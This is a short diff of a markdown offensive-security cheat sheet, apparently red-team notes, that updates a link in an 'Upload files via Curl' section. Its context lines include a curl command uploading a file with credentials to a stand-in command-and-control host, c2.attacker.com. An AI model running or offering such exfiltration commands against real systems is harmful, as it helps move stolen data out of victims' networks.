@@ -110,12 +110,11 @@ wget --mirror --convert-links --adjust-extension --page-requisites --wait=1 -o w
 ```
 
 ## Upload files via Curl
-* Combine with [Simple HTTP(s) Servers](../Infrastructure_Setup/Simple_Python_Go_Packages.html)
+* Combine with [Simple HTTP(s) Servers](../Infrastructure_Setup/Simple_Python_Go_Packages.html#projectdiscovery-simplehttpserver1)
 ```
 curl -k --user 'root:toor' --upload-file file.zip https://127.0.0.1:8000/file.zip
 curl -k --user 'root:haxorz' --upload-file file.zip https://c2.attacker.com:443/file.zip
 ```
-
 
 
 [^1]: [Stack Overflow](https://stackoverflow.com/questions/3724786/how-to-diff-two-file-lists-and-ignoring-place-in-list)
